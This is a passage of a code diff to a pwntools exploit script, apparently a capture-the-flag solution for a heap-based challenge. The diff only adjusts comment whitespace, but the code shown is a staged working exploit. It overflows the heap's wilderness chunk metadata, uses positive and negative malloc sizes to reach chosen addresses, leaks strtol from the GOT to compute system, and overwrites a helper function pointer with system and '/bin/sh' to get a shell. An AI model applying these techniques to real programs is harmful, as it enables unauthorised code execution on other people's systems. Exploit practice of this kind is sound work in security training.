@@ -210,12 +210,12 @@ r.recv(timeout=1)
 r.sendline('4')
 r.recv(timeout=1)
 
-payload = p64(0x32)							# <- ASCII '2' for print_entries
+payload = p64(0x32)				# <- ASCII '2' for print_entries
 payload += p64(0xffffffffffffffff) * 30
-payload += p64(0x111)						# restoring the current chunk's metadata
+payload += p64(0x111)				# restoring the current chunk's metadata
 payload += p64(0) * 2
 payload += p64(leak - 0x940)
-payload += p64(0xffffffffffffffff) * 31 	# overflowing the new wilderness md
+payload += p64(0xffffffffffffffff) * 31 		# overflowing the new wilderness md
 r.sendline(payload)
 
 helper_ptr = r.recvuntil('Large: ')
@@ -227,9 +227,9 @@ helper_ptr = int(r.recv(12), 16)
 log.info("helper ptr: " + hex(helper_ptr))
 
 # Stage 3 - Leak an entry from the GOT
-payload = p64(0x32)							# <- ASCII '2' for print_entries
+payload = p64(0x32)				# <- ASCII '2' for print_entries
 payload += p64(0xffffffffffffffff) * 30
-payload += p64(0x111)						# restoring the current chunk's metadata
+payload += p64(0x111)				# restoring the current chunk's metadata
 payload += p64(leak_ptr + 0x11374) * 2
 payload += p64(0)
 payload += p64(0xffffffffffffffff) * 31 	# overflowing the current wilderness
@@ -241,7 +241,7 @@ leak_strtol = r.recvuntil('Small: ')
 leak_strtol = u64(r.recv(5).ljust(8, '\0'))
 log.info("Strtol@GOT: " + hex(leak_strtol))
 
-system = leak_strtol + 0x88e8				# Calc system from leak
+system = leak_strtol + 0x88e8			# Calc system from leak
 log.info("System: " + hex(system))
 
 # Stage 4 - Overwriting helper ptr and first entries->large
@@ -249,10 +249,10 @@ r.sendline('1')
 r.recv(timeout=1)
 r.sendline('3')
 r.recv(timeout=1)
-r.sendline(str(0x490 + 0x50))	# Positive malloc to reach the first entries struct
+r.sendline(str(0x490 + 0x50)) # Positive malloc to reach the first entries struct
 r.recv(timeout=1)
 
-r.sendline('2')					# Overflow the first entries->large with '/bin/sh'
+r.sendline('2')		# Overflow the first entries->large with '/bin/sh'
 r.recv(timeout=1)
 r.sendline('/bin/sh')
 r.recv(timeout=1)
@@ -260,13 +260,13 @@ r.recv(timeout=1)
 r.sendline('3')
 r.recv(timeout=1)
 r.sendline(str(-0x860))			# Negative malloc to wrap around and reach
-r.recv(timeout=1)				# the beginning of the heap so we can overwrite
-r.sendline('2')					# the helper_ptr with system
+r.recv(timeout=1)			# the beginning of the heap so we can overwrite
+r.sendline('2')				# the helper_ptr with system
 r.recv(timeout=1)
 r.sendline(p64(system))
 r.recv(timeout=1)
 
-r.sendline('1')					# cause a call to helper_ptr
+r.sendline('1')				# cause a call to helper_ptr
 r.recv(timeout=1)
 r.sendline('1')
 r.recv(timeout=1)
